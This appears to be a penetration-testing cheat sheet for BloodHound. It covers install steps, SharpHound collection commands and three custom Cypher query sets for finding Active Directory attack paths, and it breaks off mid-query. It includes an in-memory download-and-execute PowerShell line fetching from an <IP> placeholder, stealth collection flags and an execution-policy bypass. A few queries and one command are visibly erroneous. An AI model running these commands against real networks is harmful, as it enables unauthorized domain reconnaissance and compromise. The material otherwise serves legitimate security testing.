# BloodHound

## Install BloodHound

```bash
sudo apt-get install neo4j
sudo apt-get install bloodhound

# Run neo4j then bloodhound
sudo neo4j console
sudo blooudhound
```

## Install BloodHound Community Edition

```bash
sudo apt-get install docker-compose
curl -L https://ghst.ly/getbhce | docker compose -f - up

# When finished search through the terminal (if first run) for a generated password.
# go to http://localhost:8080 and login with Admin and the password
```

## Ingestors

```bash
# Standard local execution
./SharpHound.exe --CollectionMethods All,GPOLocalGroup
Invoke-BloodHound -CollectionMethod "All,GPOLocalGroup"
Invoke-BloodHound -CollectionMethod All -CompressData -RemoveCSV
Invoke-BloodHound -CollectionMethod LoggedOn

# Specify different domain and run in stealth mode and collect only RDP data
Invoke-BloodHound --d <Domain> --Stealth --CollectionMethod RDP

# Run in context of different user
runas.exe /netonly /user:domain\user 'powershell.exe -nop -exec bypass'

# Download and execute in memory
powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('http://<IP>:/SharpHound.ps1');Invoke-BloodHound"

# Metasploit
use post/windows/gather/bloodhound       
```

## Custom Queries

Replace the `customqueries.json` with one of the below files to update the custom queries within Bloodhound. Remember to restart Bloodhound after changing the JSON file.

**Locate custom queries file**

```
sudo find / -type f -name customqueries.json 2>/dev/null  
```

Add one of the queries below:

{% tabs %}
{% tab title="Queries" %}
```perl
Click the tabs above to view relevant author's custom queries
```
{% endtab %}

{% tab title="CompassSecurity - Custom Queries" %}
**CompassSecurity's Custom Queries**

**Author Github:** [https://github.com/CompassSecurity/BloodHoundQueries](https://github.com/CompassSecurity/BloodHoundQueries)

Click on the pencil icon next to Custom Queries in the Queries tab and paste in the queries below. Then refresh Bloodhound Queries tab -> Custom Queries -> Refresh icon.

```
{
    "queries": [
        {
            "name": "All Shortest Paths to Domain (including Computers)",
            "queryList": [
                {
                    "final": false,
                    "title": "Select a Domain...",
                    "query": "MATCH (d:Domain) RETURN d.name ORDER BY d.name ASC"
                },
                {
                    "final": true,
                    "query": "MATCH p = allShortestPaths((uc)-[r:{}*1..]->(d:Domain {name: $result})) WHERE (uc:User OR uc:Computer) RETURN p",
                    "endNode": "{}"
                }
            ]
        },
        {
            "name": "All Shortest Paths to no LAPS",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH p = allShortestPaths((uc)-[r:{}*1..]->(c:Computer)) WHERE (uc:User OR uc:Computer) AND NOT uc = c AND c.haslaps = false RETURN p"
                }
            ]
        },
        {
            "name": "All Shortest Paths from Kerberoastable Users to Computers",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH p = allShortestPaths((u:User)-[r:{}*1..]->(c:Computer)) WHERE u.hasspn = true RETURN p"
                }
            ]
        },
        {
            "name": "All Shortest Paths from Kerberoastable Users to High Value Targets",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH p = allShortestPaths((u:User)-[r:{}*1..]->(h)) WHERE u.hasspn = true AND h.highvalue = true RETURN p"
                }
            ]
        },
        {
            "name": "All Shortest Paths from Owned Principals (including everything)",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH p = allShortestPaths((u:User)-[r:{}*1..]->(a)) WHERE u.owned = true AND u <> a RETURN p"
                }
            ]
        },
        {
            "name": "All Shortest Paths from Owned Principals to Domain",
            "queryList": [
                {
                    "final": false,
                    "title": "Select a Domain...",
                    "query": "MATCH (d:Domain) RETURN d.name ORDER BY d.name ASC"
                },
                {
                    "final": true,
                    "query": "MATCH p = allShortestPaths((o)-[r:{}*1..]->(d:Domain)) WHERE o.owned = true AND d.name = $result RETURN p",
                    "endNode": "{}"
                }
            ]
        },
        {
            "name": "All Shortest Paths from Owned Principals to High Value Targets",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH p = allShortestPaths((o)-[r:{}*1..]->(h)) WHERE o.owned = true AND h.highvalue = true RETURN p"
                }
            ]
        },
        {
            "name": "All Shortest Paths from Owned Principals to no LAPS",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH p = allShortestPaths((o)-[r:{}*1..]->(c:Computer)) WHERE NOT o = c AND o.owned = true AND c.haslaps = false RETURN p"
                }
            ]
        },
        {
            "name": "All Shortest Paths from no Signing to Domain",
            "queryList": [
                {
                    "final": false,
                    "title": "Select a Domain...",
                    "query": "MATCH (d:Domain) RETURN d.name ORDER BY d.name ASC"
                },
                {
                    "final": true,
                    "query": "MATCH p = allShortestPaths((c:Computer)-[r:{}*1..]->(d:Domain)) WHERE c.hassigning = false AND d.name = $result RETURN p",
                    "endNode": "{}"
                }
            ]
        },
        {
            "name": "All Shortest Paths from no Signing to High Value Targets",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH p = allShortestPaths((c:Computer)-[r:{}*1..]->(h)) WHERE NOT c = h AND c.hassigning = false AND h.highvalue = true RETURN p"
                }
            ]
        },
        {
            "name": "All Shortest Paths from Domain Users and Domain Computers (including everything)",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH p = allShortestPaths((g:Group)-[r:{}*1..]->(a)) WHERE (g.objectid =~ $domain_users_id OR g.objectid =~ $domain_computers_id) AND g <> a RETURN p",
                    "props": {
                        "domain_users_id": "S-1-5-.*-513",
                        "domain_computers_id": "S-1-5-.*-515"
                    }
                }
            ]
        },
        {
            "name": "All Unconstrained Delegation Principals (excluding Domain Controllers and Administrators)",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH (dca)-[r:MemberOf*0..]->(g:Group) WHERE g.objectid =~ $domain_controllers_id OR g.objectid =~ $administrators_id WITH COLLECT(dca) AS exclude MATCH p = (d:Domain)-[r:Contains*1..]->(uc) WHERE (uc:User OR uc:Computer) AND uc.unconstraineddelegation = true AND NOT uc IN exclude RETURN p",
                    "props": {
                        "domain_controllers_id": "S-1-5-.*-516",
                        "administrators_id": ".*-S-1-5-32-544"
                    }
                }
            ]
        },
        {
            "name": "All Constrained Delegations",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH p = (a)-[:AllowedToDelegate]->(c:Computer) RETURN p"
                }
            ]
        },
        {
            "name": "All Computers Allowed to Delegate for Another Computer",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH p = (c1:Computer)-[:AllowedToDelegate]->(c2:Computer) RETURN p"
                }
            ]
        },
        {
            "name": "All ACLs to Computers (excluding High Value Targets)",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH p = (ucg)-[r]->(c:Computer) WHERE (ucg:User OR ucg:Computer OR ucg:Group) AND ucg.highvalue = false AND r.isacl = true RETURN p"
                }
            ]
        },
        {
            "name": "All Computers in Domain Admins",
            "queryList": [
                {
                    "final": false,
                    "title": "Select a Domain Admins group...",
                    "query": "MATCH (g:Group) WHERE g.objectid =~ $domain_admins_id RETURN g.name ORDER BY g.name ASC",
                    "props": {
                        "domain_admins_id": "S-1-5-.*-512"
                    }
                },
                {
                    "final": true,
                    "query": "MATCH p = (c:Computer)-[r:MemberOf|HasSIDHistory*1..]->(g:Group) WHERE g.name = $result RETURN p",
                    "endNode": "{}"
                }
            ]
        },
        {
            "name": "All Computers Local Admin to Another Computer",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH p = (c1:Computer)-[r1:AdminTo]->(c2:Computer) RETURN p UNION ALL MATCH p = (c3:Computer)-[r2:MemberOf|HasSIDHistory*1..]->(g:Group)-[r3:AdminTo]->(c4:Computer) RETURN p"
                }
            ]
        },
        {
            "name": "All Computers without LAPS",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH p = (d:Domain)-[r:Contains*1..]->(c:Computer) WHERE c.haslaps = false RETURN p"
                }
            ]
        },
        {
            "name": "All High Value Targets",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH p = (d:Domain)-[r:Contains*1..]->(h) WHERE h.highvalue = true RETURN p"
                }
            ]
        },
        {
            "name": "All Owned Principals",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH p = (d:Domain)-[r:Contains*1..]->(o) WHERE o.owned = true RETURN p"
                }
            ]
        },
        {
            "name": "All Users with Password in AD",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH p = (d:Domain)-[r:Contains*1..]->(u:User) WHERE u.userpassword IS NOT NULL RETURN p"
                }
            ]
        },
        {
            "name": "All Users with \"Pass\" in AD Description",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH p = (d:Domain)-[r:Contains*1..]->(u:User) WHERE u.description =~ '(?i).*pass.*' RETURN p"
                }
            ]
        },
        {
            "name": "All Users with Password not Required",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH p = (d:Domain)-[r:Contains*1..]->(u:User) WHERE u.passwordnotreqd = true RETURN p"
                }
            ]
        },
        {
            "name": "All Users with with Same Name in Different Domains",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH (u1:User),(u2:User) WHERE split(u1.name,'@')[0] = split(u2.name,'@')[0] AND u1.domain <> u2.domain AND tointeger(split(u1.objectid,'-')[7]) >= 1000 RETURN u1"
                }
            ]
        },
        {
            "name": "Set DCSync Principals as High Value Targets",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH (s)-[r:MemberOf|GetChanges*1..]->(d:Domain) WITH s, d MATCH (s)-[r:MemberOf|GetChangesAll*1..]->(d) WITH s, d MATCH p = (s)-[r:MemberOf|GetChanges|GetChangesAll*1..]->(d) SET s.highvalue = true, s.highvaluereason = 'DCSync Principal' RETURN p"
                }
            ]
        },
        {
            "name": "Set Unconstrained Delegation Principals as High Value Targets",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH p = (d:Domain)-[r:Contains*1..]->(uc) WHERE (uc:User OR uc:Computer) AND uc.unconstraineddelegation = true SET uc.highvalue = true, uc.highvaluereason = 'Unconstrained Delegation Principal' RETURN p"
                }
            ]
        },
        {
            "name": "Set Local Admin or Reset Password Principals as High Value Targets",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH (a)-[r:AdminTo|ForceChangePassword]->(b) SET a.highvalue = true, a.highvaluereason = 'Local Admin or Reset Password Principal' RETURN a"
                }
            ]
        },
        {
            "name": "Set Principals with Privileges on Computers as High Value Targets",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH (a)-[r:AllowedToDelegate|ExecuteDCOM|ForceChangePassword|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner]->(n:Computer) SET a.highvalue = true, a.highvaluereason = 'Principal with Privileges on Computers' RETURN a"
                }
            ]
        },
        {
            "name": "Set Members of High Value Targets Groups as High Value Targets",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH (a)-[r:MemberOf*1..]->(g:Group) WHERE a.highvalue = false AND g.highvalue = true SET a.highvalue = true, a.highvaluereason = 'Member of High Value Target Group' RETURN a"
                }
            ]
        },
        {
            "name": "Remove Inactive Users and Computers from High Value Targets",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH (uc) WHERE uc.highvalue = true AND ((uc:User AND uc.enabled = false) OR (uc:Computer AND ((uc.enabled = false) OR (uc.lastlogon > 0 AND uc.lastlogon < (TIMESTAMP() / 1000 - 15552000)) OR (uc.lastlogontimestamp > 0 AND uc.lastlogontimestamp < (TIMESTAMP() / 1000 - 15552000))))) SET uc.highvalue = false, uc.nothighvaluereason = 'Inactive' RETURN uc"
                }
            ]
        }
    ]
}
```
{% endtab %}

{% tab title="hausec - Custom Queries" %}
**Hausec's Custom Queries**

**Author Github:** [https://github.com/hausec/Bloodhound-Custom-Queries](https://github.com/hausec/Bloodhound-Custom-Queries)

Click on the pencil icon next to Custom Queries in the Queries tab and paste in the queries below. Then refresh Bloodhound Queries tab -> Custom Queries -> Refresh icon.

```
{
    "queries": [
		{
            "name": "List all owned users",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH (m:User) WHERE m.owned=TRUE RETURN m"
                }
            ]
        },
		{
            "name": "List all owned computers",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH (m:Computer) WHERE m.owned=TRUE RETURN m"
                }
            ]
        },
			{
            "name": "List all owned groups",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH (m:Group) WHERE m.owned=TRUE RETURN m"
                }
            ]
        },
			{
            "name": "List all High Valued Targets",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH (m) WHERE m.highvalue=TRUE RETURN m"
                }
            ]
        },
			{
            "name": "List the groups of all owned users",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH (m:User) WHERE m.owned=TRUE WITH m MATCH p=(m)-[:MemberOf*1..]->(n:Group) RETURN p"
                }
            ]
        },
			{
            "name": "Find the Shortest path to a high value target from an owned object",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH p=shortestPath((g {owned:true})-[*1..]->(n {highvalue:true})) WHERE  g<>n return p"
                }
            ]
        },
			{
            "name": "Find the Shortest path to a unconstrained delegation system from an owned object",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH (n) MATCH p=shortestPath((n)-[*1..]->(m:Computer {unconstraineddelegation: true})) WHERE NOT n=m AND n.owned = true RETURN p"
                }
            ]
        },
        {

            "name": "Find all Kerberoastable Users",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH (n:User)WHERE n.hasspn=true RETURN n",
                    "allowCollapse": false
                }
            ]
        },
		{
            "name": "Find All Users with an SPN/Find all Kerberoastable Users with passwords last set less than 5 years ago",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH (u:User) WHERE u.hasspn=true AND u.pwdlastset < (datetime().epochseconds - (1825 * 86400)) AND NOT u.pwdlastset IN [-1.0, 0.0] RETURN u.name, u.pwdlastset order by u.pwdlastset "
                }
            ]
        },
		{
            "name": "Find Kerberoastable Users with a path to DA",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH (u:User {hasspn:true}) MATCH (g:Group) WHERE g.objectid ENDS WITH '-512' MATCH p = shortestPath( (u)-[*1..]->(g) ) RETURN p"
                }
            ]
        },
        {
            "name": "Find machines Domain Users can RDP into",
            "queryList": [
                {
                    "final": true,
                    "query": "match p=(g:Group)-[:CanRDP]->(c:Computer) where g.objectid ENDS WITH '-513' return p"
                }
            ]
        },
        {
            "name": "Find what groups can RDP",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH p=(m:Group)-[r:CanRDP]->(n:Computer) RETURN p"
                }
            ]
        },		
        {
            "name": "Find groups that can reset passwords (Warning: Heavy)",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH p=(m:Group)-[r:ForceChangePassword]->(n:User) RETURN p"
                }
            ]
        },
        {
            "name": "Find groups that have local admin rights (Warning: Heavy)",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH p=(m:Group)-[r:AdminTo]->(n:Computer) RETURN p"
                }
            ]
        },
        {
            "name": "Find all users that have local admin rights",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH p=(m:User)-[r:AdminTo]->(n:Computer) RETURN p"
                }
            ]
        },
        {
            "name": "Find all active Domain Admin sessions",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH (n:User)-[:MemberOf]->(g:Group) WHERE g.objectid ENDS WITH '-512' MATCH p = (c:Computer)-[:HasSession]->(n) return p"
                }
            ]
        },
		{
            "name": "Find all computers with Unconstrained Delegation",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH (c:Computer {unconstraineddelegation:true}) return c"
                }
            ]
        },
		{
            "name": "Find all computers with unsupported operating systems",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH (H:Computer) WHERE H.operatingsystem = '.*(2000|2003|2008|xp|vista|7|me).*' RETURN H"
                }
            ]
        },
		{
            "name": "Find users that logged in within the last 90 days",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH (u:User) WHERE u.lastlogon < (datetime().epochseconds - (90 * 86400)) and NOT u.lastlogon IN [-1.0, 0.0] RETURN u"
                }
            ]
        },
		{
            "name": "Find users with passwords last set within the last 90 days",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH (u:User) WHERE u.pwdlastset < (datetime().epochseconds - (90 * 86400)) and NOT u.pwdlastset IN [-1.0, 0.0] RETURN u"
                }
            ]
        },		
		{
            "name": "Find constrained delegation",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH p=(u:User)-[:AllowedToDelegate]->(c:Computer) RETURN p"
                }
            ]
        },	
		{
            "name": "Find computers that allow unconstrained delegation that AREN’T domain controllers.",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH (c1:Computer)-[:MemberOf*1..]->(g:Group) WHERE g.objectid ENDS WITH '-516' WITH COLLECT(c1.name) AS domainControllers MATCH (c2:Computer {unconstraineddelegation:true}) WHERE NOT c2.name IN domainControllers RETURN c2"
                }
            ]
        },			
		{
            "name": " Return the name of every computer in the database where at least one SPN for the computer contains the string 'MSSQL'",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH (c:Computer) WHERE ANY (x IN c.serviceprincipalnames WHERE toUpper(x) CONTAINS 'MSSQL') RETURN c"
                }
            ]
        },				
		{
            "name": "View all GPOs",
            "queryList": [
                {
                    "final": true,
                    "query": "Match (n:GPO) RETURN n"
                }
            ]
        },		
		{
            "name": "View all groups that contain the word 'admin'",
            "queryList": [
                {
                    "final": true,
                    "query": "Match (n:Group) WHERE n.name CONTAINS 'ADMIN' RETURN n"
                }
            ]
        },	
		{
            "name": "Find users that can be AS-REP roasted",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH (u:User {dontreqpreauth: true}) RETURN u"
                }
            ]
        },			
		{
            "name": "Find All Users with an SPN/Find all Kerberoastable Users with passwords last set > 5 years ago",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH (u:User) WHERE n.hasspn=true AND WHERE u.pwdlastset < (datetime().epochseconds - (1825 * 86400)) and NOT u.pwdlastset IN [-1.0, 0.0] RETURN u"
                }
            ]
        },				
		{
            "name": "Show all high value target's groups",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH p=(n:User)-[r:MemberOf*1..]->(m:Group {highvalue:true}) RETURN p"
                }
            ]
        },			
		{
            "name": "Find groups that contain both users and computers",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH (c:Computer)-[r:MemberOf*1..]->(groupsWithComps:Group) WITH groupsWithComps MATCH (u:User)-[r:MemberOf*1..]->(groupsWithComps) RETURN DISTINCT(groupsWithComps) as groupsWithCompsAndUsers"
                }
            ]
        },			
		{
            "name": "Find Kerberoastable users who are members of high value groups",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH (u:User)-[r:MemberOf*1..]->(g:Group) WHERE g.highvalue=true AND u.hasspn=true RETURN u"
                }
            ]
        },			
		{
            "name": "Find Kerberoastable users and where they are AdminTo",
            "queryList": [
                {
                    "final": true,
                    "query": "OPTIONAL MATCH (u1:User) WHERE u1.hasspn=true OPTIONAL MATCH (u1)-[r:AdminTo]->(c:Computer) RETURN u"
                }
            ]
        },			
		{
            "name": "Find computers with constrained delegation permissions and the corresponding targets where they allowed to delegate",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH (c:Computer) WHERE c.allowedtodelegate IS NOT NULL RETURN c"
                }
            ]
        },		
		{
            "name": "Find if any domain user has interesting permissions against a GPO (Warning: Heavy)",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH p=(u:User)-[r:AllExtendedRights|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|GpLink*1..]->(g:GPO) RETURN p"
                }
            ]
        },
		{
            "name": "Find if unprivileged users have rights to add members into groups",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH (n:User {admincount:False}) MATCH p=allShortestPaths((n)-[r:AddMember*1..]->(m:Group)) RETURN p"
                }
            ]
        },	
		{
            "name": "Find all users a part of the VPN group",
            "queryList": [
                {
                    "final": true,
                    "query": "Match p=(u:User)-[:MemberOf]->(g:Group) WHERE toUPPER (g.name) CONTAINS 'VPN' return p"
                }
            ]
        },
        {
            "name": "Find users that have never logged on and account is still active",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH (n:User) WHERE n.lastlogontimestamp=-1.0 AND n.enabled=TRUE RETURN n "
                }
            ]
        },
        {
            "name": "Find an object in one domain that can do something to a foreign object",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH p=(n)-[r]->(m) WHERE NOT n.domain = m.domain RETURN p"
                }
            ]
        },
        {
            "name": "Find all sessions a user in a specific domain has",
			"requireNodeSelect": true,
            "queryList": [
                {
                    "final": false,
                    "title": "Select source domain...",
                    "query": "MATCH (n:Domain) RETURN n.name ORDER BY n.name"
                },		
                {
                    "final": true,                
                    "query": "MATCH p=(m:Computer)-[r:HasSession]->(n:User {domain:{result}}) RETURN p",					
					"startNode": "{}",
                    "allowCollapse": false
                }
            ]
        },	
        {
            "name": "Find an object from domain 'A' that can do anything to a foreign object",
			"requireNodeSelect": true,
            "queryList": [
                {
                    "final": false,
                    "title": "Select source domain...",
                    "query": "MATCH (n:Domain) RETURN n.name ORDER BY n.name"
                },		
                {
                    "final": true,                
                    "query": "MATCH p=(n {domain:{result}})-[r]->(d) WHERE NOT d.domain=n.domain RETURN p",					
					"startNode": "{}",
                    "allowCollapse": false
                }
            ]
        },
        {
            "name": "Find All edges any owned user has on a computer",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH p=shortestPath((m:User)-[r*]->(b:Computer)) WHERE m.owned RETURN p"
                }
            ]
        },
        {
            "name": "----------------------------------------AZURE QUERIES----------------------------------",
            "queryList": [
                {
                    "final": true,
                    "query": ""
                }
            ]
        },
        {
            "name": "Return All Azure Users that are part of the 'Global Administrator' Role",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH p =(n)-[r:AZGlobalAdmin*1..]->(m) RETURN p"
                }
            ]
        },
        {
            "name": "Return All On-Prem users with edges to Azure",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH  p=(m:User)-[r:AZResetPassword|AZOwns|AZUserAccessAdministrator|AZContributor|AZAddMembers|AZGlobalAdmin|AZVMContributor|AZOwnsAZAvereContributor]->(n) WHERE m.objectid CONTAINS 'S-1-5-21' RETURN p"
                }
            ]
        },
        {
            "name": "Find all paths to an Azure VM",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH p = (n)-[r]->(g:AZVM) RETURN p"
                }
            ]
        },
        {
            "name": "Find all paths to an Azure KeyVault",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH p = (n)-[r]->(g:AZKeyVault) RETURN p"
                }
            ]
        },
        {
            "name": "Return All Azure Users and their Groups",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH p=(m:AZUser)-[r:MemberOf]->(n) WHERE NOT m.objectid CONTAINS 'S-1-5' RETURN p"
                }
            ]
        },
        {
            "name": "Return All Azure AD Groups that are synchronized with On-Premise AD",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH (n:Group) WHERE n.objectid CONTAINS 'S-1-5' AND n.azsyncid IS NOT NULL RETURN n"
                }
            ]
        },
        {
            "name": "Find all Privileged Service Principals",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH p = (g:AZServicePrincipal)-[r]->(n) RETURN p"
                }
            ]
        },
        {
            "name": "Find all Owners of Azure Applications",
            "queryList": [
                {
                    "final": true,
                    "query": "MATCH p = (n)-[r:AZOwns]->(g:AZApp) RETURN p"
                }
            ]
        }
	]
}
```
{% endtab %}

{% tab title="Seajaysec - Custom Queries" %}
**Seajaysec's Custom Queries**

**Author Github:** [https://gist.github.com/seajaysec/a4d4a545047a51053d52cba567f78a9b](https://gist.github.com/seajaysec/a4d4a545047a51053d52cba567f78a9b)

Click on the pencil icon next to Custom Queries in the Queries tab and paste in the queries below. Then refresh Bloodhound Queries tab -> Custom Queries -> Refresh icon.

```
{
    "queries": [{
            "name": "List all owned users",
            "queryList": [{
                "final": true,
                "query": "MATCH (m:User) WHERE m.owned=TRUE RETURN m"
            }]
        },
        {
            "name": "List all owned computers",
            "queryList": [{
                "final": true,
                "query": "MATCH (m:Computer) WHERE m.owned=TRUE RETURN m"
            }]
        },
        {
            "name": "List all owned groups",
            "queryList": [{
                "final": true,
                "query": "MATCH (m:User) WHERE m.owned=TRUE RETURN m"
            }]
        },
        {
            "name": "List the groups of all owned users",
            "queryList": [{
                "final": true,
                "query": "MATCH (m:User) WHERE m.owned=TRUE WITH m MATCH p=(m)-[:MemberOf*1..]->(n:Group) RETURN p"
            }]
        },
        {
            "name": "Show owned Nodes with Groups",
            "queryList": [{
                "final": true,
                "query": "MATCH (u:User {owned:true}), (g:Group), p=(u)-[:MemberOf]->(g) RETURN p",
                "props": {},
                "allowCollapse": true
            }]
        },
        {
            "name": "Find logged in Admins",
            "queryList": [{
                "final": true,
                "query": "MATCH p=(a:Computer)-[r:HasSession]->(b:User) WITH a,b,r MATCH p=shortestPath((b)-[:AdminTo|MemberOf*1..]->(a)) RETURN p",
                "allowCollapse": true
            }]
        },
        {
            "name": "Top Ten Users with Most Sessions",
            "queryList": [{
                "final": true,
                "query": "MATCH (n:User),(m:Computer), (n)<-[r:HasSession]-(m) WHERE NOT n.name STARTS WITH 'ANONYMOUS LOGON' AND NOT n.name='' WITH n, count(r) as rel_count order by rel_count desc LIMIT 10 MATCH p=(m)-[r:HasSession]->(n) RETURN p",
                "allowCollapse": true
            }]
        },
        {
            "name": "Top Ten Computers with Most Sessions",
            "queryList": [{
                "final": true,
                "query": "MATCH (n:User),(m:Computer), (n)<-[r:HasSession]-(m) WHERE NOT n.name STARTS WITH 'ANONYMOUS LOGON' AND NOT n.name='' WITH m, count(r) as rel_count order by rel_count desc LIMIT 10 MATCH p=(m)-[r:HasSession]->(n) RETURN n,r,m",
                "allowCollapse": true
            }]
        },
        {

            "name": "Find all Kerberoastable Users",
            "queryList": [{
                "final": true,
                "query": "MATCH (n:User)WHERE n.hasspn=true RETURN n",
                "allowCollapse": false
            }]
        },
        {
            "name": "Find All Users with an SPN/Find all Kerberoastable Users with passwords last set less than 5 years ago",
            "queryList": [{
                "final": true,
                "query": "MATCH (u:User) WHERE u.hasspn=true AND u.pwdlastset < (datetime().epochseconds - (1825 * 86400)) AND NOT u.pwdlastset IN [-1.0, 0.0] RETURN u.name, u.pwdlastset order by u.pwdlastset "
            }]
        },
        {
            "name": "Find Kerberoastable Users with a path to DA",
            "queryList": [{
                "final": true,
                "query": "MATCH (u:User {hasspn:true}) MATCH (g:Group) WHERE g.objectid ENDS WITH '-512' MATCH p = shortestPath( (u)-[*1..]->(g) ) RETURN p"
            }]
        },
        {
            "name": "Find Kerberoastable Users with a path to High Value",
            "queryList": [{
                "final": true,
                "query": "MATCH (u:User {hasspn:true}),(n {highvalue:true}),p = shortestPath( (u)-[*1..]->(n) ) RETURN p"
            }]
        },
        {
            "name": "Find machines Domain Users can RDP into",
            "queryList": [{
                "final": true,
                "query": "match p=(g:Group)-[:CanRDP]->(c:Computer) where g.objectid ENDS WITH '-513' return p"
            }]
        },
        {
            "name": "Find Servers Domain Users can RDP To",
            "queryList": [{
                "final": true,
                "query": "match p=(g:Group)-[:CanRDP]->(c:Computer) where g.name STARTS WITH 'DOMAIN USERS' AND c.operatingsystem CONTAINS 'Server' return p",
                "allowCollapse": true
            }]
        },
        {
            "name": "Find what groups can RDP",
            "queryList": [{
                "final": true,
                "query": "MATCH p=(m:Group)-[r:CanRDP]->(n:Computer) RETURN p"
            }]
        },
        {
            "name": "Non Admin Groups with High Value Privileges",
            "queryList": [{
                "final": true,
                "query": "MATCH p=(g:Group)-[r:Owns|:WriteDacl|:GenericAll|:WriteOwner|:ExecuteDCOM|:GenericWrite|:AllowedToDelegate|:ForceChangePassword]->(n:Computer) WHERE NOT g.name CONTAINS 'ADMIN' RETURN p",
                "allowCollapse": true
            }]
        },
        {
            "name": "Find groups that can reset passwords (Warning: Heavy)",
            "queryList": [{
                "final": true,
                "query": "MATCH p=(m:Group)-[r:ForceChangePassword]->(n:User) RETURN p"
            }]
        },
        {
            "name": "Groups with Computer and User Objects",
            "queryList": [{
                "final": true,
                "query": "MATCH (c:Computer)-[r:MemberOf*1..]->(groupsWithComps:Group) WITH groupsWithComps MATCH (u:User)-[r:MemberOf*1..]->(groupsWithComps) RETURN DISTINCT(groupsWithComps) as groupsWithCompsAndUsers",
                "allowCollapse": true,
                "endNode": "{}"
            }]
        },
        {
            "name": "Find groups that have local admin rights (Warning: Heavy)",
            "queryList": [{
                "final": true,
                "query": "MATCH p=(m:Group)-[r:AdminTo]->(n:Computer) RETURN p"
            }]
        },
        {
            "name": "Find all users that have local admin rights",
            "queryList": [{
                "final": true,
                "query": "MATCH p=(m:User)-[r:AdminTo]->(n:Computer) RETURN p"
            }]
        },
        {
            "name": "Top Ten Users with Most Local Admin Rights",
            "queryList": [{
                "final": true,
                "query": "MATCH (n:User),(m:Computer), (n)-[r:AdminTo]->(m) WHERE NOT n.name STARTS WITH 'ANONYMOUS LOGON' AND NOT n.name='' WITH n, count(r) as rel_count order by rel_count desc LIMIT 10 MATCH p=(m)<-[r:AdminTo]-(n) RETURN p",
                "allowCollapse": true
            }]
        },
        {
            "name": "Top Ten Computers with Most Admins",
            "queryList": [{
                "final": true,
                "query": "MATCH (n:User),(m:Computer), (n)-[r:AdminTo]->(m) WHERE NOT n.name STARTS WITH 'ANONYMOUS LOGON' AND NOT n.name='' WITH m, count(r) as rel_count order by rel_count desc LIMIT 10 MATCH p=(m)<-[r:AdminTo]-(n) RETURN p",
                "allowCollapse": true
            }]
        },
        {
            "name": "Find all active Domain Admin sessions",
            "queryList": [{
                "final": true,
                "query": "MATCH (n:User)-[:MemberOf]->(g:Group) WHERE g.objectid ENDS WITH '-512' MATCH p = (c:Computer)-[:HasSession]->(n) return p"
            }]
        },
        {
            "name": "Can a user from domain ‘A ‘ do anything to any computer in domain ‘B’ (Warning: VERY Heavy)",
            "queryList": [{
                    "final": false,
                    "title": "Select source domain...",
                    "query": "MATCH (n:Domain) RETURN n.name ORDER BY n.name DESC"
                },
                {
                    "final": false,
